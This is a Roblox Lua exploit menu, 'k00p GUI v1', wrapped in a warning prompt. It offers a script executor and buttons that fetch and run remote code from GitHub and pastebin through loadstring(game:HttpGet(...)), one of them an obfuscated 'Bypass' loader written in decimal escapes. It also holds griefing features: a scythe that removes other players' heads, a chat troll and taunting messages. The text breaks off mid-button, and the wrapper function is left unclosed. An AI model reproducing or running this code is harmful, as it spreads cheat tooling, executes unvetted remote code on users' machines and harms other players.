if not game:IsLoaded() then game.Loaded:Wait() end
local ScreenGui = Instance.new("ScreenGui")
            local Frame = Instance.new("Frame")
            local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
            local UICorner = Instance.new("UICorner")
            local UIListLayout = Instance.new("UIListLayout")
            local TextLabel = Instance.new("TextLabel")
            local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
            local UICorner_2 = Instance.new("UICorner")
 local UICorner_3 = Instance.new("UICorner")

            ScreenGui.Parent = game:GetService("CoreGui");
            ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            Frame.Parent = ScreenGui
            Frame.BackgroundColor3 = Color3.fromRGB(19, 24, 52)
            Frame.Position = UDim2.new(0.5, 0, .5, 0)
            Frame.Size = UDim2.new(.55, 0, .6, 0)
            Frame.AnchorPoint = Vector2.new(.5,.5)

            UIAspectRatioConstraint.Parent = Frame
            UIAspectRatioConstraint.AspectRatio = 2.000

            UICorner.CornerRadius = UDim.new(0, 15)
            UICorner.Parent = Frame

            UIListLayout.Parent = Frame
            UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
            UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
            UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
            UIListLayout.Padding = UDim.new(.05, 0)

            TextLabel.Parent = Frame
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BackgroundTransparency = 1.000
            TextLabel.Position = UDim2.new(0.5, 0, 0.1, 0)
            TextLabel.Size = UDim2.new(1, 0, .5, 0)
            TextLabel.Font = Enum.Font.GothamBlack
            TextLabel.Text = [[WARNING!
 This script may do something unexpected. Would you like to add Guardian for an additional layer of protection? (You can choose not to if you trust this script, otherwise it's best to keep it in.)]]
            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.TextSize = 17.000
            TextLabel.TextWrapped = true

            TextButton.Parent = Frame
            TextButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            TextButton.Size = UDim2.new(.5, 0, .15, 0)
            TextButton.Font = Enum.Font.SourceSans
            TextButton.Text = "Yes"
            TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
            TextButton.TextSize = 41.000
            TextButton.TextWrapped = true
            
	TextButton_2.Parent = Frame
            TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            TextButton_2.Size = UDim2.new(.5, 0, .15, 0)
            TextButton_2.Font = Enum.Font.SourceSans
            TextButton_2.Text = "No"
            TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
            TextButton_2.TextSize = 41.000
            TextButton_2.TextWrapped = true

            UICorner_2.CornerRadius = UDim.new(.1, 0)
            UICorner_2.Parent = TextButton
		UICorner_3.CornerRadius = UDim.new(.1, 0)
            UICorner_3.Parent = TextButton_2
            local function AnswerNo()
ScreenGui:Destroy()
-- Gui to Lua
-- Version: 1.0
-- Gui Name: k00p Gui
-- Game: 

game.StarterGui:SetCore("SendNotification", {
Title = "k00p GUI v1";
Text = "Script made by ItMeJinxx"; -- what the text says (ofc)
Duration = 10;
})

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
local TextButton_7 = Instance.new("TextButton")
local TextButton_8 = Instance.new("TextButton")
local TextButton_9 = Instance.new("TextButton")
local TextButton_10 = Instance.new("TextButton")
local TextButton_11 = Instance.new("TextButton")
local TextButton_12 = Instance.new("TextButton")
local TextButton_13 = Instance.new("TextButton")
local TextButton_14 = Instance.new("TextButton")
local TextButton_15 = Instance.new("TextButton")
local TextButton_16 = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
Main.BorderColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderSizePixel = 5
Main.Position = UDim2.new(0.21171169, 0, 0.181818172, 0)
Main.Size = UDim2.new(0, 383, 0, 237)
Main.Active = true
Main.Draggable = true

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BorderSizePixel = 4
TextLabel.Position = UDim2.new(-0.0652741492, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 429, 0, 41)
TextLabel.Font = Enum.Font.PatrickHand
TextLabel.Text = "k00p GUI 1v"
TextLabel.TextColor3 = Color3.fromRGB(225, 0, 3)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton.BorderSizePixel = 3
TextButton.Position = UDim2.new(0.0208877288, 0, 0.23206751, 0)
TextButton.Size = UDim2.new(0, 68, 0, 30)
TextButton.Font = Enum.Font.PatrickHand
TextButton.Text = "RC7"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
TextButton.MouseButton1Down:connect(function()
if game.CoreGui:FindFirstChild("RC7LOLOL") then
    game.CoreGui:FindFirstChild("RC7LOLOL"):Destroy()
    end
    local Screen = game:GetObjects("rbxassetid://14625538289")[1]
    Screen.Parent = game.CoreGui
    local RC7 = Screen.RC7
    local Explorer = Screen.Explorer
    local Save = Screen.Save
    local Open = Screen.Open
    local CurrentTab = "1"
    local Buttonz = RC7.Buttons
    local NewestTab = 1
    if not isfolder("RC7Scripts") then
        makefolder("RC7Scripts")
    end
    
    Explorer.Visible = false
    Open.Visible = false
    Save.Visible = false
    RC7.Draggable = true
    Open.Draggable = true
    Open.Active = true
    RC7.Active = true
    
    for i,v in next, listfiles("RC7Scripts") do
        local a = Explorer.Buttons.Yes:Clone()
        a.Parent = Explorer.Buttons
        a.Visible = true
        a.Text = v 
        a.Name = v
        a.MouseButton1Click:Connect(function()
        pcall(function()
            RC7.TabTexts:FindFirstChild(CurrentTab):FindFirstChild(CurrentTab).Text = readfile(listfiles("RC7Scripts")[i])
        end)
        Explorer.Visible = false
        end)
    end
    
    Save.save.MouseButton1Click:Connect(function()
    writefile("RC7Scripts/" .. tostring(Save.name.Text) .. ".lua", tostring(RC7.TabTexts:FindFirstChild(CurrentTab):FindFirstChild(CurrentTab).Text))
    Save.Visible = false
    end)
    
    Buttonz.Execute.MouseButton1Click:Connect(function()
     local success, result = pcall(function()
        assert(loadstring(RC7.TabTexts[CurrentTab][CurrentTab].Text))()
    end)
    
    if not success then
    local Error = RC7.Console.Error:Clone()
    Error.Text = result
    Error.Parent = RC7.Console
    Error.Visible = true
    end
    end)
    
    Buttonz.Open.MouseButton1Click:Connect(function()
        Explorer.Visible = true
    end)
    
    Explorer.Exit.MouseButton1Click:Connect(function()
        Explorer.Visible = false
    end)
    
    Buttonz.Clear.MouseButton1Click:Connect(function()
        RC7.TabTexts:FindFirstChild(CurrentTab):FindFirstChild(CurrentTab).Text = ""
    end)
    
    Buttonz.Inf.MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end)
    
    Buttonz.Save.MouseButton1Click:Connect(function()
        Save.Visible = true
    end)
    
    Save.Close.MouseButton1Click:Connect(function()
        Save.Visible = false
    end)
    
    Buttonz.Idk.MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))()
    end)
    
    Buttonz.Dex.MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
    end)
    
    Buttonz.Attach.MouseButton1Click:Connect(function()
    if messagebox then
        wait(2)
        messagebox("RC7", "Attached", 0)
    end
    end)
    
    RC7.Tabs:FindFirstChild(1).MouseButton1Click:Connect(function()
    CurrentTab = "1"
    for i,v in next, RC7.TabTexts:GetChildren() do
    if v.Name == "1" then
    v.Visible = true
    else
    v.Visible = false
    end
    end
    end)
    
    local function ANewTab()
    local Tab = RC7.Tabs:FindFirstChild(1):Clone()
    NewestTab = NewestTab + 1
    Tab.Parent = RC7.Tabs
    Tab.Name = tostring(NewestTab)
    Tab.Text = "(" .. Tab.Name .. ").lua"
    local TextBoxClone = RC7.TabTexts:FindFirstChild(1):Clone()
    TextBoxClone.Parent = RC7.TabTexts
    TextBoxClone.Name = NewestTab
    TextBoxClone:FindFirstChild(1).Name = NewestTab
    TextBoxClone[NewestTab].Text = ""
    Tab.MouseButton1Click:Connect(function()
    CurrentTab = Tab.Name
    for i,v in next, RC7.TabTexts:GetChildren() do
    if v.Name == Tab.Name then
    v.Visible = true
    else
    v.Visible = false
    end
    end
    end)
    end

    RC7.Top.Frame.Close.MouseButton1Click:Connect(function()
    Open.Visible = true
    RC7.Visible = false
    end)
    
    RC7.Tabs.AddNewTab.MouseButton1Click:Connect(function()
    ANewTab()
    RC7.Tabs.AddNewTab.Parent = RC7
    wait()
    RC7.AddNewTab.Parent = RC7.Tabs
    end)
    
    
    Open.MouseButton1Click:Connect(function()
    Open.Visible = false
    RC7.Visible = true
    end)
    
    RC7.TabTexts:FindFirstChild(CurrentTab):FindFirstChild(CurrentTab).Text = ""
end)
TextButton_2.Parent = Main
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_2.BorderSizePixel = 3
TextButton_2.Position = UDim2.new(0.263707578, 0, 0.23206751, 0)
TextButton_2.Size = UDim2.new(0, 68, 0, 30)
TextButton_2.Font = Enum.Font.PatrickHand
TextButton_2.Text = "Ghosthub"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true
TextButton_2.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
end)
TextButton_3.Parent = Main
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_3.BorderSizePixel = 3
TextButton_3.Position = UDim2.new(0.498694509, 0, 0.23206751, 0)
TextButton_3.Size = UDim2.new(0, 68, 0, 30)
TextButton_3.Font = Enum.Font.PatrickHand
TextButton_3.Text = "Bypass"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true
TextButton_3.MouseButton1Down:connect(function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
end)
TextButton_4.Parent = Main
TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_4.BorderSizePixel = 3
TextButton_4.Position = UDim2.new(0.736292422, 0, 0.23206751, 0)
TextButton_4.Size = UDim2.new(0, 68, 0, 30)
TextButton_4.Font = Enum.Font.PatrickHand
TextButton_4.Text = "K00P hub"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true
TextButton_4.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/JinxxHub'))()
end)
TextButton_5.Parent = Main
TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_5.BorderSizePixel = 3
TextButton_5.Position = UDim2.new(0.736292422, 0, 0.434599161, 0)
TextButton_5.Size = UDim2.new(0, 68, 0, 30)
TextButton_5.Font = Enum.Font.PatrickHand
TextButton_5.Text = "scythe" 
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextScaled = true
TextButton_5.TextSize = 14.000
TextButton_5.TextWrapped = true
TextButton_5.MouseButton1Down:connect(function()
--tribal scythe made by jarredbcv, ideas from masterepico
local player = game.Players.LocalPlayer
local pchar = player.Character
local mouse = player:GetMouse()
local torso=pchar.Torso
anim=true
anglespeed = 1
angle = 0
maxrage = 9001
rage = 9001 -- ITS OVER 9000!
local asin = math.asin
local atan2 = math.atan2
local rad = math.rad
local sin = math.sin
local abs = math.abs
local ceil = math.ceil
local pi = math.pi
deddeb=false
deb=false
Part = function(x,y,z,color,tr,cc,an,parent)
    local p = Instance.new('Part',parent or Weapon)
    p.formFactor = 'Custom'
    p.Size = Vector3.new(x,y,z)
    p.BrickColor = BrickColor.new(color)
    p.CanCollide = cc
    p.Transparency = tr
    p.Anchored = an
    p.TopSurface,p.BottomSurface = 0,0
    return p
end
Weld = function(p0,p1,x,y,z,rx,ry,rz,par)
    p0.Position = p1.Position
    local w = Instance.new('Motor',par or p0)
    w.Part0 = p0
    w.Part1 = p1
    w.C1 = CFrame.new(x,y,z)*CFrame.Angles(rx,ry,rz)
    return w
end
Mesh = function(par,num,x,y,z)
    local msh = nil
    if num == 1 then
        msh = Instance.new("CylinderMesh",par)
    elseif num == 2 then
        msh = Instance.new("SpecialMesh",par)
        msh.MeshType = 3
    elseif num == 3 then
        msh = Instance.new("BlockMesh",par)
    elseif num == 4 then
        msh = Instance.new("SpecialMesh",par)
        msh.MeshType = "Wedge"
    elseif type(num) == 'string' then
        msh = Instance.new("SpecialMesh",par)
        msh.MeshId = num
    end
    msh.Scale = Vector3.new(x,y,z)
    return msh
end
so = function(id,par,lo,pi)
    s = Instance.new("Sound",par) s.Looped=lo s.Pitch=pi
    s.SoundId = "http://roblox.com/asset/?id="..id s:play()
end
ROW = function(x, pa, out, col, trans, s, wt, t, ang, plus)
    for i = 1, 360, 360/t do wait()
        local c = Instance.new("Part", pa)
        c.FormFactor = 3
        c.TopSurface = 0
        c.BottomSurface = 0
        c.Size = s
        c.Anchored = true
        c.CanCollide = wt
        c.Transparency = trans
        c.BrickColor = BrickColor.new(col)
        c.CFrame = x * CFrame.Angles(0, math.rad(i + plus), 0) * CFrame.new(0, 0, out) * ang
    end
end
Lightning = function(Start,End,Times,Offset,Color,Thickness,Transparency)
    local magz = (Start - End).magnitude local curpos = Start local trz = {-Offset,Offset}
    for i=1,Times do 
		local li = Instance.new("Part",workspace) li.TopSurface =0 li.BottomSurface = 0 li.Anchored = true  li.Transparency = Transparency or 0.4 li.BrickColor = BrickColor.new(Color)
        li.formFactor = "Custom" li.CanCollide = false li.Size = Vector3.new(Thickness,Thickness,magz/Times) local ofz = Vector3.new(trz[math.random(1,2)],trz[math.random(1,2)],trz[math.random(1,2)]) 
		local trolpos = CFrame.new(curpos,End)*CFrame.new(0,0,magz/Times).p+ofz
        if Times == i then 
            local magz2 = (curpos - End).magnitude li.Size = Vector3.new(Thickness,Thickness,magz2)
            li.CFrame = CFrame.new(curpos,End)*CFrame.new(0,0,-magz2/2)
        else
            li.CFrame = CFrame.new(curpos,trolpos)*CFrame.new(0,0,magz/Times/2)
        end
        curpos = li.CFrame*CFrame.new(0,0,magz/Times/2).p game.Debris:AddItem(li,0.01)
    end
end

local function getAngles(cf)
    local sx,sy,sz,m00,m01,m02,m10,m11,m12,m20,m21,m22 = cf:components()
    return atan2(-m12,m22),asin(m02),atan2(-m01,m00)
end
Lerp = {
    Number = function(C1,C2,inc)
        return C1 + (C2 - C1) * inc
    end;
    CFrame = function(C1,C2,inc)
        local x1,y1,z1 = getAngles(C1)
        local x2,y2,z2 = getAngles(C2)
        return CFrame.new(
            Lerp.Number(C1.X,C2.X,inc),
            Lerp.Number(C1.Y,C2.Y,inc),
            Lerp.Number(C1.Z,C2.Z,inc)
        ) * CFrame.Angles(
            Lerp.Number(x1,x2,inc),
            Lerp.Number(y1,y2,inc),
            Lerp.Number(z1,z2,inc)
        )
    end;
}
local function genWeld(a,b)
    local w = Instance.new("Weld",a)
    w.Part0 = a
    w.Part1 = b
    return w
end
local Neck = genWeld(pchar.Torso,pchar.Head)
Neck.C0 = CFrame.new(0,1,0)
Neck.C1 = CFrame.new(0,-0.5,0)
local LeftShoulder = genWeld(pchar.Torso,pchar['Left Arm'])
LeftShoulder.C0 = CFrame.new(-1,0.5,0)
LeftShoulder.C1 = CFrame.new(0.5,0.5,0)
RightShoulder = genWeld(pchar.Torso,pchar['Right Arm'])
RightShoulder.C0 = CFrame.new(1,0.5,0)
RightShoulder.C1 = CFrame.new(-0.5,0.5,0)
local LeftHip = genWeld(pchar.Torso,pchar['Left Leg'])
LeftHip.C0 = CFrame.new(-1,-1,0)
LeftHip.C1 = CFrame.new(-0.5,1,0)
local RightHip = genWeld(pchar.Torso,pchar['Right Leg'])
RightHip.C0 = CFrame.new(1,-1,0)
RightHip.C1 = CFrame.new(0.5,1,0)
local RootJoint = genWeld(pchar.HumanoidRootPart,pchar.Torso)
RootJoint.C0 = CFrame.new(0,0,0) * CFrame.Angles(-math.pi/2,0,math.pi)
RootJoint.C1 = CFrame.new(0,0,0) * CFrame.Angles(-math.pi/2,0,math.pi)
local function newLerpTo(weld)
        return {
                Weld = weld; -- The weld that will lerp
                To = weld.C0; -- Where it will lerp to; a CFrame
                Cache = weld.C0; -- Cache of original position; it helps when making anim keyframes
                Speed = 0.1; -- Speed of lerp. 0.1 or 0.2 is best
        }
end
LerpTo = {
        Neck = newLerpTo(Neck);
        LeftArm = newLerpTo(LeftShoulder);
        RightArm = newLerpTo(RightShoulder);
        LeftLeg = newLerpTo(LeftHip);
        RightLeg = newLerpTo(RightHip);
        RootJoint = newLerpTo(RootJoint);
}
-- gui 
sc = Instance.new("ScreenGui",player.PlayerGui)
sc.Name = "RaigMeter"
fr = Instance.new("Frame",sc)
fr.Size = UDim2.new(0, 250, 0, 28)
fr.Position = UDim2.new(0.75, 0, .95, 0)
fr.BackgroundColor3 = Color3.new(0.8, 0.8, 0.8)
met = Instance.new("Frame", fr)
met.Size = UDim2.new(1, -10, 1, -6)
met.Position = UDim2.new(0, 5, 0, 3)
met.BackgroundColor3 = Color3.new(0, 0, 0)
met.BorderSizePixel = 0
metr = Instance.new("ImageLabel", met)
metr.Size = UDim2.new(rage/maxrage, 0, 1, -2)
metr.Position = UDim2.new(0, 0, 0, 1)
metr.Image = "http://www.roblox.com/asset/?id=112941056"
metr.BorderSizePixel = 0
metr.BackgroundColor3 = Color3.new(0,0,0)
tx = Instance.new("TextLabel", met)
tx.Size = UDim2.new(0, 0, 1, 0)
tx.Position = UDim2.new(0, 5, 0, 0)
tx.Text = rage.." / "..maxrage
tx.Font = "ArialBold"
tx.FontSize = "Size18"
tx.BackgroundTransparency = 1
tx.TextColor3 = BrickColor.new("Deep orange").Color
tx.TextXAlignment = "Left"
laast = rage
-- func
function click()
    if deb==true then return end
    deb=true
    anim=false
    ded= Part(.5,0,2,'White',1,false,false,mo)
    dedwl= Weld(ded,rot,0,0,0,0,0,0,mo)
    ded.Touched:connect(function(hit)
    if deddeb==true then return end
    if hit.Parent:findFirstChild("Humanoid") ~= nil and hit.Parent:findFirstChild("Humanoid").Health >= 1 then 
    deddeb=true
    local hed=hit.Parent.Head:Clone()
    hed.Parent=workspace
    hed.CFrame=hit.Parent.Head.CFrame
    hit.Parent.Head:Destroy()
    wait(1)
    game.Debris:AddItem(hed,10)
    deddeb=false
        end
    end)
    so('10209645',torso,false,.75)
    LerpTo.Neck.To = LerpTo.Neck.Cache * CFrame.Angles(0,-rad(20),0)
    LerpTo.RightArm.To = LerpTo.RightArm.Cache * CFrame.Angles(rad(60),0,0)
    LerpTo.LeftArm.To = LerpTo.LeftArm.Cache * CFrame.Angles(-rad(5),0,0)
    LerpTo.RightLeg.To = LerpTo.RightLeg.Cache * CFrame.Angles(rad(10),0,0)
    LerpTo.LeftLeg.To = LerpTo.LeftLeg.Cache * CFrame.Angles(-rad(10),0,0) 
    wait(.1)
    LerpTo.Neck.To = LerpTo.Neck.Cache * CFrame.Angles(0,rad(20),0)
    LerpTo.RightArm.To = LerpTo.RightArm.Cache * CFrame.Angles(rad(60),0,-rad(60))
    LerpTo.LeftArm.To = LerpTo.LeftArm.Cache * CFrame.Angles(rad(5),0,0)
    LerpTo.RightLeg.To = LerpTo.RightLeg.Cache * CFrame.Angles(-rad(10),0,0)
    LerpTo.LeftLeg.To = LerpTo.LeftLeg.Cache * CFrame.Angles(rad(10),0,0)
    wait(.2)
    LerpTo.Neck.To = LerpTo.Neck.Cache * CFrame.Angles(0,-rad(20),0)
    LerpTo.RightArm.To = LerpTo.RightArm.Cache * CFrame.Angles(rad(80),rad(20),rad(100))
    LerpTo.LeftArm.To = LerpTo.LeftArm.Cache * CFrame.Angles(rad(5),0,0)
    LerpTo.RightLeg.To = LerpTo.RightLeg.Cache * CFrame.Angles(-rad(10),0,0)
    LerpTo.LeftLeg.To = LerpTo.LeftLeg.Cache * CFrame.Angles(rad(10),0,0)
    so('28144425',torso,false,1)
    wait(.3)
    ded:Destroy()
    wait(.25)
    anim=true
    wait(.75)
    deb=false
end


--keys
mouse.Button1Down:connect(function() click(mouse) end)
mouse.KeyDown:connect(function(k)
    if k == "q" then
    end
end)
--parts
mo=Instance.new("Model",pchar)
mpa= Part(1,1,1,'Earth green',0,false,false,mo)
Mesh(mpa,1,.3,6,.3)
mwl= Weld(mpa,pchar["Right Arm"],0,-1.1,0,-pi/2,pi/1,-pi/3.5,mo)
pa= Part(1,1,1,'Brown',0,false,false,mo)
Mesh(pa,3,.301,6,.1)
wl= Weld(pa,mpa,0,0,0,0,0,0,mo)
pa= Part(1,1,1,'Brown',0,false,false,mo)
Mesh(pa,3,.301,6,.1)
wl= Weld(pa,mpa,0,0,0,0,pi/2,0,mo)
for i=1,7 do
    pa= Part(1,1,1,'Black',0,false,false,mo)
    Mesh(pa,1,.301,.2,.301)
    wl= Weld(pa,mpa,0,-4+i,0,0,0,0,mo)
end
-- blade
cl= Part(1,1,1,'Deep orange',0,false,false,mo)
Mesh(cl,3,.1,.5,.5)
clwl= Weld(cl,mpa,0,3,0,0,0,0,mo)
pa= Part(1,1,1,'Deep orange',0,false,false,mo)
Mesh(pa,4,.1,.5,1)
wl= Weld(pa,cl,0,0,.75,0,pi/1,0,mo)
bla= Part(1,1,1,'Deep orange',0,false,false,mo)
Mesh(bla,4,.1,.5,1)
wl= Weld(bla,cl,0,-.585,1.7,rad(10),pi/1,0,mo)
pa= Part(1,1,1,'Deep orange',0,false,false,mo)
Mesh(pa,4,.1,.5,1)
wl= Weld(pa,cl,0,-1.298,2.5,rad(20),pi/1,0,mo)
pa= Part(1,1,1,'Deep orange',0,false,false,mo)
Mesh(pa,3,.1,.3,1)
wl= Weld(pa,cl,0,-.4,.75,0,pi/1,0,mo)
pa= Part(1,1,1,'Deep orange',0,false,false,mo)
Mesh(pa,3,.1,.3,.5)
wl= Weld(pa,bla,0,-.4,-.2,0,0,0,mo)
pa= Part(1,1,1,'Black',0,false,false,mo)
Mesh(pa,3,.09,.2,.9)
wl= Weld(pa,cl,0,-.65,.75,0,pi/1,0,mo)
pa= Part(1,1,1,'Black',0,false,false,mo)
Mesh(pa,4,.1,.3,.5)
wl= Weld(pa,bla,0,-.4,.3,0,pi/1,pi/1,mo)
pa= Part(1,1,1,'Black',0,false,false,mo)
Mesh(pa,4,.09,.175,.55)
wl= Weld(pa,bla,0,-.63,-.2,0,pi/1,pi/1,mo)
rot= Part(1,1,1,'Really black',0,false,false,mo)
Mesh(rot,1,.5,.09,.5)
pawl= Weld(rot,cl,0,0,-.25,0,0,pi/2,mo)
pa= Part(.1,.1,.1,'Black',0,false,false,mo)
Mesh(pa,'http://www.roblox.com/Asset/?id=9756362',.2,.75,.2)
pawl= Weld(pa,rot,0,0,-.75,pi/2,0,0,mo)
pa= Part(.1,.1,.1,'Black',0,false,false,mo)
Mesh(pa,'http://www.roblox.com/Asset/?id=9756362',.2,.75,.2)
pawl= Weld(pa,rot,.5,0,-.5,pi/2,0,pi/3,mo)

local function updateanims()
    if anim==true then
        if Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude < 2 then
            anglespeed = 1/3
            LerpTo.Neck.To = LerpTo.Neck.Cache * CFrame.Angles(sin(angle)*0.05,0,0)
            LerpTo.RightArm.To = LerpTo.RightArm.Cache * CFrame.Angles(rad(150),-rad(15)+abs(sin(angle))*0.1,rad(30))
            LerpTo.LeftArm.To = LerpTo.LeftArm.Cache * CFrame.Angles(sin(angle)*0.1,0,0)
            LerpTo.RightLeg.To = LerpTo.RightLeg.Cache * CFrame.Angles(0,0,abs(sin(angle))*0.1)
            LerpTo.LeftLeg.To = LerpTo.LeftLeg.Cache * CFrame.Angles(0,0,-abs(sin(angle))*0.1) 
        end
        if Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude > 2 then
            anglespeed = 4
            LerpTo.Neck.To = LerpTo.Neck.Cache * CFrame.Angles(0,0,math.sin(angle)*0.05)
            LerpTo.RightArm.To = LerpTo.RightArm.Cache * CFrame.Angles(rad(80),rad(20),0)
            LerpTo.LeftArm.To = LerpTo.LeftArm.Cache * CFrame.Angles(rad(100),0,rad(20))
            LerpTo.RightLeg.To = LerpTo.RightLeg.Cache * CFrame.Angles(sin(angle)*.8,0,0)
            LerpTo.LeftLeg.To = LerpTo.LeftLeg.Cache * CFrame.Angles(-sin(angle)*.8,0,0) 
        end
    end
end
local function onupdate()
    if rage > maxrage then rage=maxrage end
    tx.Text = ceil(rage).." / "..maxrage
    metr.Size = UDim2.new(ceil(rage)/maxrage, 0, 1, -2)
end

Spawn(function()
    while wait()do
        angle = (angle % 100) + anglespeed/10 -- no matter whut it has to be in a loop or its on exticy
    end 
end)
meo=0
sdeb=false
game:service'RunService'.RenderStepped:connect(function()
    meo=meo+1
        for _,v in pairs(LerpTo) do
        v.Weld.C0 = Lerp.CFrame(v.Weld.C0,v.To,v.Speed)end
        onupdate()
    updateanims()
end)
end)
TextButton_6.Parent = Main
TextButton_6.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_6.BorderSizePixel = 3
TextButton_6.Position = UDim2.new(0.498694509, 0, 0.434599161, 0)
TextButton_6.Size = UDim2.new(0, 68, 0, 30)
TextButton_6.Font = Enum.Font.PatrickHand
TextButton_6.Text = "Resizer"
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextScaled = true
TextButton_6.TextSize = 14.000
TextButton_6.TextWrapped = true
TextButton_6.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg Resize'))()
--r15
end)
TextButton_7.Parent = Main
TextButton_7.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_7.BorderSizePixel = 3
TextButton_7.Position = UDim2.new(0.263707578, 0, 0.434599161, 0)
TextButton_7.Size = UDim2.new(0, 68, 0, 30)
TextButton_7.Font = Enum.Font.PatrickHand
TextButton_7.Text = "Keyboard gui"
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextScaled = true
TextButton_7.TextSize = 14.000
TextButton_7.TextWrapped = true
TextButton_7.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
end)
TextButton_8.Parent = Main
TextButton_8.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_8.BorderSizePixel = 3
TextButton_8.Position = UDim2.new(0.0208877325, 0, 0.434599161, 0)
TextButton_8.Size = UDim2.new(0, 68, 0, 30)
TextButton_8.Font = Enum.Font.PatrickHand
TextButton_8.Text = "Chat Troll"
TextButton_8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.TextScaled = true
TextButton_8.TextSize = 14.000
TextButton_8.TextWrapped = true
TextButton_8.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/vUsHbiTR"))()
end)
TextButton_9.Parent = Main
TextButton_9.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_9.BorderSizePixel = 3
TextButton_9.Position = UDim2.new(0.736292422, 0, 0.637130797, 0)
TextButton_9.Size = UDim2.new(0, 68, 0, 30)
TextButton_9.Font = Enum.Font.PatrickHand
TextButton_9.Text = "Message"
TextButton_9.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_9.TextScaled = true
TextButton_9.TextSize = 14.000
TextButton_9.TextWrapped = true
TextButton_9.MouseButton1Down:connect(function()
local m = Instance.new("Message", game.Workspace)
m.Text = "k00p is back muahahahahaha!"
wait(3)
m.Text = "Nubs!"
wait(2)
m.Text = "You cannot ban me HAHA!"
wait(5)
 
local unit = 10
wait(1)
for i = 1, 10 do
	unit = unit - 1
	m.Text = "Dont forget that I'll never get banned!"
	wait(1)
end
 
m.Text = "hahahahahaha!!!!"
 
local prey = nil
local parts = script.Parent:GetChildren() 
 
for i = 1,#parts do 
	if (parts[i].className == "Part") then 
		if (prey ~= nil)then 
			prey:Destroy()
		end 
		prey = parts[i] 
	end 
end
end)
TextButton_10.Parent = Main
TextButton_10.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
TextButton_10.BorderSizePixel = 3
